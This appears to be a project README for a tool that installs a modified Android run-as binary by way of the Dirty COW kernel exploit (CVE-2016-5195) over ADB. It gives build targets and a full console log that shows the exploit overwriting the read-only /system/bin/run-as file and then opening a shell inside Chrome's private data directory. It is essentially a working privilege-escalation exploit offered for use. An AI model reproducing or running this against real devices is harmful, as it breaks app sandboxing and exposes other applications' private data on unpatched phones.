# run-as for non debuggable packages

A version of run-as that can be used with non debuggable packages.

Installed using the dirtycow exploit ([CVE-2016-5195](https://github.com/timwr/CVE-2016-5195)) via ADB. Using the dirtycow exploit, a nonpriviledged user can overwrite read-only files, in this case the run-as binary (which has the CAP_SETUID capability).

**make test** - tries to overwrite a readonly test file

**make root** - overwrites the /system/bin/run-as binary with a version that works with packages that have `android:debuggable="false"` set in their manifest. Rebooting will removed the overwritten run-as binary, as for some reason the dirty cow changes to /system are not persisted (see [here](https://github.com/timwr/CVE-2016-5195/issues/9#issuecomment-257111568)).

eg:
```
$ make root
ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=armeabi-v7a APP_PLATFORM=android-22
[armeabi-v7a] Install        : libselinux.so => libs/armeabi-v7a/libselinux.so
[armeabi-v7a] Install        : dirtycow => libs/armeabi-v7a/dirtycow
[armeabi-v7a] Install        : run-as => libs/armeabi-v7a/run-as
adb push libs/armeabi-v7a/dirtycow /data/local/tmp/dcow
libs/armeabi-v7a/dirtycow: 1 file pushed. 3.7 MB/s (13784 bytes in 0.004s)
adb shell 'chmod 777 /data/local/tmp/dcow'
adb shell 'chmod 777 /data/local/tmp/dcow'
adb push libs/armeabi-v7a/run-as /data/local/tmp/run-as
libs/armeabi-v7a/run-as: 1 file pushed. 4.2 MB/s (13792 bytes in 0.003s)
adb shell '/data/local/tmp/dcow /data/local/tmp/run-as /system/bin/run-as'
WARNING: linker: /data/local/tmp/dcow: unused DT entry: type 0x6ffffffe arg 0x630
WARNING: linker: /data/local/tmp/dcow: unused DT entry: type 0x6fffffff arg 0x1
dcow /data/local/tmp/run-as /system/bin/run-as
warning: new file size (13792) and destination file size (9440) differ

corruption?

[*] size 13792
[*] mmap 0xb6ec4000
[*] currently 0xb6ec4000=464c457f
[*] madvise = 0xb6ec4000 13792
[*] madvise = 0 221560
[*] /proc/self/mem 20152320 1640
[*] exploited 0xb6ec4000=464c457f
```
```
$ adb shell /system/bin/run-as com.android.chrome
WARNING: linker: /system/bin/run-as: unused DT entry: type 0x6ffffffe arg 0x768
WARNING: linker: /system/bin/run-as: unused DT entry: type 0x6fffffff arg 0x1
Package 'com.android.chrome' is not debuggable, no problem!
u0_a10@mako:/data/data/com.android.chrome $
```
Tested on an LG Nexus 4 (Android version: 5.1.1 Kernel version: 3.4.0-perf-gdffc258 Jul 2015)
